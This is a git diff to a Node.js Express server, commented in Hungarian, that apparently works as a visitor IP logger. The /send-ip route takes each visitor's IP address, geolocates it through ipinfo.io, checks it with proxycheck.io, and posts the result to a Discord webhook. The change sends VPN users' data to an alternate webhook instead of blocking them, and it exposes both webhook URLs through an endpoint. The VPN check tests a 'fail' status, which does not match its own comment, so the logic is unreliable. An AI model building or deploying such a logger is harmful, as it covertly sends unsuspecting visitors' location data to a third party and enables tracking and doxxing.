@@ -8,10 +8,11 @@ const port = process.env.PORT || 3000;
 // Statikus fájlok kiszolgálása (CSS, JS, stb.)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook URL és IPINFO token a .env fájlból
+// Webhook URL-ek és API kulcsok a .env fájlból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
 const ipinfoToken = process.env.IPINFO_TOKEN;
-const proxycheckApiKey = process.env.PROXYCHECK_API_KEY; // API kulcs itt
+const proxycheckApiKey = process.env.PROXYCHECK_API_KEY;
 
 // Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
 app.get('/', (req, res) => {
@@ -20,7 +21,7 @@ app.get('/', (req, res) => {
 
 // /get-webhook-url útvonal a webhook URL-ek elküldéséhez
 app.get('/get-webhook-url', (req, res) => {
-    res.json({ webhookUrl });
+    res.json({ webhookUrl, altWebhookUrl });
 });
 
 // /send-ip útvonal
@@ -28,15 +29,14 @@ app.get('/send-ip', async (req, res) => {
     const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
 
     try {
-        // Proxycheck API hívása a VPN és proxy felismerésére
-        const proxyCheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxycheckApiKey}`);
-        const isVPN = proxyCheckResponse.data.status === 'ok' && proxyCheckResponse.data.proxies === 'yes';
+        // Ellenőrizzük, hogy VPN-t használ-e az IP
+        const proxycheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxycheckApiKey}`);
+        const proxycheckData = proxycheckResponse.data;
 
-        if (isVPN) {
-            return res.status(403).send('VPN vagy proxy használata nem engedélyezett.');
-        }
+        // Ha VPN-t észlelünk, használjuk az alternatív webhook URL-t
+        const webhookToUse = proxycheckData.status === 'fail' ? altWebhookUrl : webhookUrl;
 
-        // IPinfo API lekérése
+        // IP geolokáció lekérése ipinfo.io segítségével
         const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
         const geoData = geoResponse.data;
 
@@ -53,8 +53,9 @@ app.get('/send-ip', async (req, res) => {
             }]
         };
 
-        // Webhook küldés
-        await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
+        // Webhook üzenet küldése a megfelelő URL-re (alapértelmezett vagy alternatív)
+        await axios.post(webhookToUse, message);
+
         res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
         console.error('Hiba:', error.message);
